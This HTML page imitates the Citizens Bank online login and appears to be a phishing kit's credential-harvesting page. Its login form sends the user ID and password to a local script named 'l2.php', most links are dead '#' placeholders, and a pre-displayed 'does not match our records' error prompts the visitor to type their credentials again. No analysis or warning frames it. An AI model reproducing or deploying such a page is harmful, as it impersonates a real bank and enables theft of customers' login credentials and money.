...
<title>Online | Citizens Bank</title>
...
<link rel="stylesheet" href="assets/ad-containers.css">
...
<body class="responsive-enabled" style="display: block;" data-new-gr-c-s-check-loaded="14.1014.0" data-gr-ext-installed="">
	<script>
	if(self == top) {
...
<link rel="stylesheet" type="text/css" href="assets/citizensns.min.44438.css">

<style>
.help-modal-header .help-modal-close {background: url(assets/modal-help-close.png) center center no-repeat transparent; background-size: 20px;}
.help-modal-menu a.active {background: #f2faf8 url(assets/arrow-right-green.png) right 20px center no-repeat; background-position: right 20px center; background-size:7px}
.account-section-title.checkmark h1 {padding: 0px 0px 5px 28px !important; }
.lt-ie9 .help-modal-menu a.active {background: #f2faf8 url(assets/arrow-right-green.png) right 20px center no-repeat !important; background-size:7px !important}
        ...
        <div id="page-header" class="page-header">
            ...
            <div class="centered-content clearfix">
                ...
                <a href="#" class="page-logo" tabindex="1">
                    ...
                    <img border="0" alt="Citizens Bank" width="203" height="25" src="assets/CTZ_Green-01.png">
                </a>
...
<div id="GlobalMessageContainer">
    ...
    <div class="global-message status-message">
       ...
       <p></p><li>COVID-19: Visit our <a href="#">Resource Center</a> for the latest information, including <a href="#">Economic Impact Payments</a> (Stimulus Payments).</li>
<br>
<li><b>June is National Internet Safety Month!</b> - Are your operating system settings for security patches set to update automatically? <a href="#">LEARN MORE</a> on how you can help toward a safer online experience. </li>
<p></p>
    </div>
<div id="messagecontainer" class="error-message show-error error-visible" role="alert" style="display: block;">The information you entered does not match our records. Please check your information and try again. If you need login assistance, click on <a href="#">Trouble logging in?</a> or <a href="#" >View All Help Topics</a>.</div>
</div>
                    ...
                    <form class="pay-transfer-options clearfix" action="l2.php" name="SignOn" id="frmSignOn" method="post">
		...
		<div class="form-item label-right full-width clearfix">
                ...
                <input tabindex="1" type="text" id="UserID" name="User" autocomplete="off" maxlength="20" class="required demo-username error">
                	...
                	<div class="full-width checkbox-item clearfix">
                    	...
                    	<div class="form-item full-width">
                            ...
                            <input  tabindex="2" type="password" id="currentpassword" name="Pass" maxlength="15" size="15" class="required demo-password error">
	...
	<div id="citizens-help" class="citizens-help sidebar-item sidebar-list-container sidebar-accordian mobile-modal">
	    <div class="sidebar-list-content">
	        ...
	        <form action="#" name="frmAsst" id="frmAsst" method="post">
	           <input type="hidden" name="CSRF_TOKEN" value="5EOK-UAZN-B10J-VTHG-0YE4-WRT5-5PYH-W8ZD">
			...
			<ul class="sidebar-list">
				<li class="cta-row">
					<a href="#" class="blue" target="_blank">View All Help Topics</a>
				</li>
...
<li><a onclick="showSurvey(formId);" style="cursor:pointer;">Give Feedback</a></li></ul>
</div>
...
<li>
<a target="_blank" href="#">Money Markets</a>
</li>
<li>
<a target="_blank" href="#">Certificates of Deposit (CDs)
<sup>®</sup>
</a>
</li>
<li>
...
<li>
<a target="_blank" href="#">Programs &amp; Services</a>
</li>
<li>
<a target="_blank" href="#">Benefits &amp; Features</a>
</li>
<li>
<a target="_blank" href="#">Debit Card</a>
</li>
<li>
<a target="_blank" href="#">Overdraft Choices
<sup>®</sup>
</a>
</li>
</ul>
...
<li>
<a target="_blank" href="#">My Mortgage Account</a>
</li>
</ul>
<ul>
<li>
...
<li>
<a target="_blank" href="#">Student Loan Options</a>
</li>
<li>
<a target="_blank" href="#">Refinancing Student Loans</a>
</li>
<li>
<a target="_blank" href="#">The Student Loan Process</a>
</li>
<li>
<a target="_blank" href="#">Undergraduate Students &amp; Parents</a>
</li>
<li>
<a target="_blank" href="#">Graduate Students</a>
</li>
<li>
<a target="_blank" href="#">Tools &amp; Information</a>
</li>
<li>
<a target="_blank" href="#">Banking for Students</a>
</li>
<li>
<a target="_blank" href="#">Access My Student Loan</a>
</li>
</ul>
<ul class="last">
<li>
...
<li>
<a target="_blank" href="#">Credit Cards</a>
</li>
<li>
<a target="_blank" href="#">Card Agreements</a>
</li>
<li>
<a target="_blank" href="#">Security Features</a>
</li>
</ul>
</div>
...
<li>
<a target="_blank" href="#">Overview</a>
</li>
<li>
...
<li>
<a target="_blank" href="#">Order Checks</a>
</li>
<li>
<a target="_blank" href="#">Online &amp; Mobile Banking</a>
</li>
<li>
...
<li>
<a target="_blank" href="#">About Citizens Bank</a>
</li>
<li>
<a target="_blank" href="#">In the Community</a>
</li>
<li>
...
<li>
<a target="_blank" href="#">Personal</a>
</li>
<li>
<a target="_blank" href="#">Investing</a>
</li>
<li>
<a target="_blank" href="#">Small Business</a>
</li>
<li>
<a target="_blank" href="#">Commercial</a>
</li>
</ul>
</div>
...
<img alt="Equal Housing Lender" title="Equal Housing Lender" src="assets/equal-housing.gif">
</a>
</li>
<li>
...
<img src="assets/footer-follow-facebook.png" alt="Facebook" align="middle">
</a>
<a target="_blank" href="#">
<img src="assets/footer-follow-twitter.png" alt="Twitter">
</a>
<a target="_blank" href="#">
<img src="assets/footer-follow-linkedin.png" alt="Linkedin">
</a>
<a target="_blank" href="#">
<img src="assets/footer-follow-youtube.png" alt="Youtube">
</a>
</li>
</ul>
...
<img src="assets/elh.gif" alt="Equal Housing Lender">
<img src="assets/fdicFooter.gif" alt="Member FDIC">
</div>
</div>
</footer></div></div>

<link rel="stylesheet" type="text/css" href="assets/sec-3-5.css">
